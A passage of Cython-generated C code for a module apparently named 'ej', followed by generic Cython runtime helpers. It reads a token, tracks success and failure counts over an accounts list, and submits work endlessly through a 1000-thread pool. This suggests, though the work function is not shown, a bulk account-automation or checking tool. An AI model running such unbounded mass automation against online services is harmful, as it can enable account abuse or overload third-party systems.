__Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);\n  __Pyx_GIVEREF(__pyx_t_6);\n  PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_t_6);\n  __pyx_t_6 = 0;\n  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_2, 3, __pyx_t_9, __pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_2) < 0) __PYX_ERR(0, 62, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_failed, __pyx_int_0) < 0) __PYX_ERR(0, 65, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_success, __pyx_int_0) < 0) __PYX_ERR(0, 66, __pyx_L1_error)\n\n  \n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_retry, __pyx_int_0) < 0) __PYX_ERR(0, 67, __pyx_L1_error)\n\n  \n  __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 68, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_accounts, __pyx_t_2) < 0) __PYX_ERR(0, 68, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_2ej_1work, 0, __pyx_n_s_work, NULL, __pyx_n_s_ej, __pyx_d, ((PyObject *)__pyx_codeobj__14)); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_work, __pyx_t_2) < 0) __PYX_ERR(0, 71, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 91, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 91, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_max_workers, __pyx_int_1000) < 0) __PYX_ERR(0, 91, __pyx_L1_error)\n  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_empty_tuple, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 91, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_start, __pyx_t_5) < 0) __PYX_ERR(0, 91, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  \n  while (1) {\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_start); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 94, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 94, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_work); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 94, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __pyx_t_7 = NULL;\n    __pyx_t_11 = 0;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_2))) {\n      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);\n      if (likely(__pyx_t_7)) {\n        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);\n        __Pyx_INCREF(__pyx_t_7);\n        __Pyx_INCREF(function);\n        __Pyx_DECREF_SET(__pyx_t_2, function);\n        __pyx_t_11 = 1;\n      }\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_t_6};\n      __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_11, 1+__pyx_t_11);\n      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 94, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    }\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_AbBs); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 95, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ab); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_success); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_6 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 96, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = PyNumber_Add(__pyx_kp_u__15, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __pyx_t_6 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_2, __pyx_kp_u__16); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 96, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_failed); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = PyNumber_Add(__pyx_t_6, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __pyx_t_5 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_2, __pyx_kp_u__17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_5, __pyx_kp_u__18); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n    \n    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 96, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n    \n    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 98, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_5);\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n    \n    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 99, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_2);\n    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 99, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_6);\n    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __pyx_t_2 = NULL;\n    __pyx_t_11 = 0;\n    #if CYTHON_UNPACK_METHODS\n    if (unlikely(PyMethod_Check(__pyx_t_6))) {\n      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_6);\n      if (likely(__pyx_t_2)) {\n        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);\n        __Pyx_INCREF(__pyx_t_2);\n        __Pyx_INCREF(function);\n        __Pyx_DECREF_SET(__pyx_t_6, function);\n        __pyx_t_11 = 1;\n      }\n    }\n    #endif\n    {\n      PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_n_u_clear};\n      __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_11, 1+__pyx_t_11);\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 99, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n    }\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n  }\n\n  \n  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_5) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n  /*--- Wrapped vars code ---*/\n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_6);\n  __Pyx_XDECREF(__pyx_t_7);\n  __Pyx_XDECREF(__pyx_t_8);\n  if (__pyx_m) {\n    if (__pyx_d && stringtab_initialized) {\n      __Pyx_AddTraceback("init ej", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    #if !CYTHON_USE_MODULE_STATE\n    Py_CLEAR(__pyx_m);\n    #else\n    Py_DECREF(__pyx_m);\n    if (pystate_addmodule_run) {\n      PyObject *tp, *value, *tb;\n      PyErr_Fetch(&tp, &value, &tb);\n      PyState_RemoveModule(&__pyx_moduledef);\n      PyErr_Restore(tp, value, tb);\n    }\n    #endif\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, "init ej");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #elif PY_MAJOR_VERSION >= 3\n  return __pyx_m;\n  #else\n  return;\n  #endif\n}\n/* #### Code section: cleanup_globals ### */\n/* #### Code section: cleanup_module ### */\n/* #### Code section: main_method ### */\n/* #### Code section: utility_code_pragmas ### */\n#ifdef _MSC_VER\n#pragma warning( push )\n/* Warning 4127: conditional expression is constant\n * Cython uses constant conditional expressions to allow in inline functions to be optimized at\n * compile-time, so this warning is not useful\n */\n#pragma warning( disable : 4127 )\n#endif\n\n\n\n/* #### Code section: utility_code_def ### */\n\n/* --- Runtime support code --- */\n/* Refnanny */\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m = PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, "RefNannyAPI");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n/* PyErrExceptionMatches */\n#if CYTHON_FAST_THREAD_STATE\nstatic int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {\n    int result;\n    PyObject *exc_type;\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject *current_exception = tstate->current_exception;\n    if (unlikely(!current_exception)) return 0;\n    exc_type = (PyObject*) Py_TYPE(current_exception);\n    if (exc_type == err) return 1;\n#else\n    exc_type = tstate->curexc_type;\n    if (exc_type == err) return 1;\n    if (unlikely(!exc_type)) return 0;\n#endif\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_INCREF(exc_type);\n    #endif\n    if (unlikely(PyTuple_Check(err))) {\n        result = __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);\n    } else {\n        result = __Pyx_PyErr_GivenExceptionMatches(exc_type, err);\n    }\n    #if CYTHON_AVOID_BORROWED_REFS\n    Py_DECREF(exc_type);\n    #endif\n    return result;\n}\n#endif\n\n/* PyErrFetchRestore */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject *tmp_value;\n    assert(type == NULL || (value != NULL && type == (PyObject*) Py_TYPE(value)));\n    if (value) {\n        #if CYTHON_COMPILING_IN_CPYTHON\n        if (unlikely(((PyBaseExceptionObject*) value)->traceback != tb))\n        #endif\n            PyException_SetTraceback(value, tb);\n    }\n    tmp_value = tstate->current_exception;\n    tstate->current_exception = value;\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(type);\n    Py_XDECREF(tb);\n#else\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n#endif\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n#if PY_VERSION_HEX >= 0x030C00A6\n    PyObject* exc_value;\n    exc_value = tstate->current_exception;\n    tstate->current_exception = 0;\n    *value = exc_value;\n    *type = NULL;\n    *tb = NULL;\n    if (exc_value) {\n        *type = (PyObject*) Py_TYPE(exc_value);\n        Py_INCREF(*type);\n        #if CYTHON_COMPILING_IN_CPYTHON\n        *tb = ((PyBaseExceptionObject*) exc_value)->traceback;\n        Py_XINCREF(*tb);\n        #else\n        *tb = PyException_GetTraceback(exc_value);\n        #endif\n    }\n#else\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n#endif\n}\n#endif\n\n/* PyObjectGetAttrStr */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n#if PY_MAJOR_VERSION < 3\n    if (likely(tp->tp_getattr))\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\n#endif\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n/* PyObjectGetAttrStrNoError */\nstatic void __Pyx_PyObject_GetAttrStr_ClearAttributeError(void) {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    if (likely(__Pyx_PyErr_ExceptionMatches(PyExc_AttributeError)))\n        __Pyx_PyErr_Clear();\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStrNoError(PyObject* obj, PyObject* attr_name) {\n    PyObject *result;\n#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_TYPE_SLOTS && PY_VERSION_HEX >= 0x030700B1\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro == PyObject_GenericGetAttr)) {\n        return _PyObject_GenericGetAttrWithDict(obj, attr_name, NULL, 1);\n    }\n#endif\n    result = __Pyx_PyObject_GetAttrStr(obj, attr_name);\n    if (unlikely(!result)) {\n        __Pyx_PyObject_GetAttrStr_ClearAttributeError();\n    }\n    return result;\n}\n\n/* GetBuiltinName */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStrNoError(__pyx_b, name);\n    if (unlikely(!result) && !PyErr_Occurred()) {\n        PyErr_Format(PyExc_NameError,\n#if PY_MAJOR_VERSION >= 3\n            "name \'%U\' is not defined", name);\n#else\n            "name \'%.200s\' is not defined", PyString_AS_STRING(name));\n#endif\n    }\n    return result;\n}\n\n/* TupleAndListFromArray */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE void __Pyx_copy_object_array(PyObject *const *CYTHON_RESTRICT src, PyObject** CYTHON_RESTRICT dest, Py_ssize_t length) {\n    PyObject *v;\n    Py_ssize_t i;\n    for (i = 0; i < length; i++) {\n        v = dest[i] = src[i];\n        Py_INCREF(v);\n    }\n}\nstatic CYTHON_INLINE PyObject *\n__Pyx_PyTuple_FromArray(PyObject *const *src, Py_ssize_t n)\n{\n    PyObject *res;\n    if (n <= 0) {\n        Py_INCREF(__pyx_empty_tuple);\n        return __pyx_empty_tuple;\n    }\n    res = PyTuple_New(n);\n    if (unlikely(res == NULL)) return NULL;\n    __Pyx_copy_object_array(src, ((PyTupleObject*)res)->ob_item, n);\n    return res;\n}\nstatic CYTHON_INLINE PyObject *\n__Pyx_PyList_FromArray(PyObject *const *src, Py_ssize_t n)\n{\n    PyObject *res;\n    if (n <= 0) {\n        return PyList_New(0);\n    }\n    res = PyList_New(n);\n    if (unlikely(res == NULL)) return NULL;\n    __Pyx_copy_object_array(src, ((PyListObject*)res)->ob_item, n);\n    return res;\n}\n#endif\n\n/* BytesEquals */\nstatic CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {\n#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API\n    return PyObject_RichCompareBool(s1, s2, equals);\n#else\n    if (s1 == s2) {\n        return (equals == Py_EQ);\n    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {\n        const char *ps1, *ps2;\n        Py_ssize_t length = PyBytes_GET_SIZE(s1);\n        if (length != PyBytes_GET_SIZE(s2))\n            return (equals == Py_NE);\n        ps1 = PyBytes_AS_STRING(s1);\n        ps2 = PyBytes_AS_STRING(s2);\n        if (ps1[0] != ps2[0]) {\n            return (equals == Py_NE);\n        } else if (length == 1) {\n            return (equals == Py_EQ);\n        } else {\n            int result;\n#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)\n            Py_hash_t hash1, hash2;\n            hash1 = ((PyBytesObject*)s1)->ob_shash;\n            hash2 = ((PyBytesObject*)s2)->ob_shash;\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\n                return (equals == Py_NE);\n            }\n#endif\n            result = memcmp(ps1, ps2, (size_t)length);\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\n        }\n    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {\n        return (equals == Py_NE);\n    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {\n        return (equals == Py_NE);\n    } else {\n        int result;\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\n        if (!py_result)\n            return -1;\n        result = __Pyx_PyObject_IsTrue(py_result);\n        Py_DECREF(py_result);\n        return result;\n    }\n#endif\n}\n\n/* UnicodeEquals */\nstatic CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {\n#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API\n    return PyObject_RichCompareBool(s1, s2, equals);\n#else\n#if PY_MAJOR_VERSION < 3\n    PyObject* owned_ref = NULL;\n#endif\n    int s1_is_unicode, s2_is_unicode;\n    if (s1 == s2) {\n        goto return_eq;\n    }\n    s1_is_unicode = PyUnicode_CheckExact(s1);\n    s2_is_unicode = PyUnicode_CheckExact(s2);\n#if PY_MAJOR_VERSION < 3\n    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {\n        owned_ref = PyUnicode_FromObject(s2);\n        if (unlikely(!owned_ref))\n            return -1;\n        s2 = owned_ref;\n        s2_is_unicode = 1;\n    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {\n        owned_ref = PyUnicode_FromObject(s1);\n        if (unlikely(!owned_ref))\n            return -1;\n        s1 = owned_ref;\n        s1_is_unicode = 1;\n    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {\n        return __Pyx_PyBytes_Equals(s1, s2, equals);\n    }\n#endif\n    if (s1_is_unicode & s2_is_unicode) {\n        Py_ssize_t length;\n        int kind;\n        void *data1, *data2;\n        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))\n            return -1;\n        length = __Pyx_PyUnicode_GET_LENGTH(s1);\n        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {\n            goto return_ne;\n        }\n#if CYTHON_USE_UNICODE_INTERNALS\n        {\n            Py_hash_t hash1, hash2;\n        #if CYTHON_PEP393_ENABLED\n            hash1 = ((PyASCIIObject*)s1)->hash;\n            hash2 = ((PyASCIIObject*)s2)->hash;\n        #else\n            hash1 = ((PyUnicodeObject*)s1)->hash;\n            hash2 = ((PyUnicodeObject*)s2)->hash;\n        #endif\n            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {\n                goto return_ne;\n            }\n        }\n#endif\n        kind = __Pyx_PyUnicode_KIND(s1);\n        if (kind != __Pyx_PyUnicode_KIND(s2)) {\n            goto return_ne;\n        }\n        data1 = __Pyx_PyUnicode_DATA(s1);\n        data2 = __Pyx_PyUnicode_DATA(s2);\n        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {\n            goto return_ne;\n        } else if (length == 1) {\n            goto return_eq;\n        } else {\n            int result = memcmp(data1, data2, (size_t)(length * kind));\n            #if PY_MAJOR_VERSION < 3\n            Py_XDECREF(owned_ref);\n            #endif\n            return (equals == Py_EQ) ? (result == 0) : (result != 0);\n        }\n    } else if ((s1 == Py_None) & s2_is_unicode) {\n        goto return_ne;\n    } else if ((s2 == Py_None) & s1_is_unicode) {\n        goto return_ne;\n    } else {\n        int result;\n        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);\n        #if PY_MAJOR_VERSION < 3\n        Py_XDECREF(owned_ref);\n        #endif\n        if (!py_result)\n            return -1;\n        result = __Pyx_PyObject_IsTrue(py_result);\n        Py_DECREF(py_result);\n        return result;\n    }\nreturn_eq:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(owned_ref);\n    #endif\n    return (equals == Py_EQ);\nreturn_ne:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(owned_ref);\n    #endif\n    return (equals == Py_NE);\n#endif\n}\n\n/* fastcall */\n#if CYTHON_METH_FASTCALL\nstatic CYTHON_INLINE PyObject * __Pyx_GetKwValue_FASTCALL(PyObject *kwnames, PyObject *const *kwvalues, PyObject *s)\n{\n    Py_ssize_t i, n = PyTuple_GET_SIZE(kwnames);\n    for (i = 0; i < n; i++)\n    {\n        if (s == PyTuple_GET_ITEM(kwnames, i)) return kwvalues[i];\n    }\n    for (i = 0; i < n; i++)\n    {\n        int eq = __Pyx_PyUnicode_Equals(s, PyTuple_GET_ITEM(kwnames, i), Py_EQ);\n        if (unlikely(eq != 0)) {\n            if (unlikely(eq < 0)) return NULL;  // error\n            return kwvalues[i];\n        }\n    }\n    return NULL;  // not found (no exception set)\n}\n#endif\n\n/* PyDictVersioning */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n/* GetModuleGlobalName */\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if !CYTHON_AVOID_BORROWED_REFS\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    } else if (unlikely(PyErr_Occurred())) {\n        return NULL;\n    }\n#elif CYTHON_COMPILING_IN_LIMITED_API\n    if (unlikely(!__pyx_m)) {\n        return NULL;\n    }\n    result = PyObject_GetAttr(__pyx_m, name);\n    if (likely(result)) {\n        return result;\n    }\n#else\n    result = PyDict_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n#endif\n#else\n    result = PyObject_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return 